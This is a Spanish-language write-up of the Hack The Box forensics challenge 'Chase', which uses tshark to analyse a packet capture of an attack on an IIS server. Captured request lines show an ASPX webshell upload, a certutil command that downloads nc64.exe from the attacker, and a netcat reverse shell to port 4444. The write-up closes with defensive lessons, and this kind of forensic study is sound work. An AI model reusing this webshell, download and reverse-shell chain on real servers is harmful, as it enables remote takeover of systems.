---
title: "Chase"
description: "Writeup de Chase - Hack The Box - Forensics 200pts. Análisis de pcap con webshell IIS (upload.aspx → cmd.aspx) y reverse shell via nc64.exe; el nombre del fichero transferido es la flag en base32."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - pcap
  - tshark
  - iis
  - webshell
  - base32
  - windows
---

# Chase

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Se nos entrega un archivo `chase.pcapng`. Hay que determinar qué ocurrió en la red y recuperar la flag oculta en el tráfico.

---

## Reconocimiento del pcap

```bash
tshark -r chase.pcapng -q -z io,phs
```

El pcap contiene tráfico HTTP. Listar todas las peticiones:

```bash
tshark -r chase.pcapng -Y "http.request" -T fields \
  -e ip.src -e ip.dst -e http.request.method -e http.request.uri
```

```text
<attacker>  <server>  POST  /upload.aspx
<attacker>  <server>  GET   /cmd.aspx?cmd=whoami
<attacker>  <server>  GET   /cmd.aspx?cmd=certutil+-urlcache+-f+http://...+nc64.exe
<attacker>  <server>  GET   /cmd.aspx?cmd=nc64.exe+<attacker>+4444+-e+cmd.exe
```

**Cadena de ataque visible en las URIs:**
1. Subida de `upload.aspx` (file upload en el servidor IIS).
2. Uso de `cmd.aspx` como webshell para ejecutar comandos.
3. Descarga de `nc64.exe` con certutil.
4. Conexión reverse shell hacia el atacante en el puerto 4444.

---

## Sesión de reverse shell (puerto 4444)

```bash
tshark -r chase.pcapng -Y "tcp.port == 4444" \
  -T fields -e data | xxd -r -p | strings
```

```text
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
iis apppool\defaultapppool
```

El servidor corre Windows Server 2008 R2 y la shell es como `iis apppool\defaultapppool`.

---

## Flag oculta en el nombre del fichero

En el tráfico del puerto 4444 se ve la descarga de un archivo cuyo nombre está codificado en **base32**:

```bash
tshark -r chase.pcapng -Y "tcp.port == 4444" -T fields -e data \
  | xxd -r -p | strings | grep -oE "[A-Z2-7]{30,}"
```

```text
JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA
```

Decodificar:

```bash
echo "JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA" | base32 -d
```

```text
HTB{FLAG}
```

---

## Cadena de Ataque

```text
1. POST /upload.aspx → sube webshell .aspx al servidor IIS
       ↓
2. GET /cmd.aspx?cmd=whoami → confirma ejecución como IIS AppPool
       ↓
3. certutil → descarga nc64.exe desde servidor del atacante
       ↓
4. nc64.exe → reverse shell al atacante en puerto 4444
       ↓
5. Nombre del fichero descargado codificado en base32 → flag
```

---

## Lecciones Aprendidas

- **IIS file upload sin restricciones**: la subida de un `.aspx` con capacidad de ejecución es directamente RCE. El servidor debería restringir las extensiones ejecutables.
- **Certutil como downloader**: herramienta legítima de Windows usada frecuentemente para descargar payloads; monitorizar su uso fuera de contextos de administración.
- **Steganografía en nombres de archivo**: la flag no estaba en el contenido del tráfico sino en el nombre del archivo transferido — siempre revisar metadatos y strings no obvios.

---

## Referencias

- [HackTricks — ASPX Webshells](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services)
- [tshark — Following TCP streams](https://tshark.dev/analyze/get_started/tshark_decryption/)
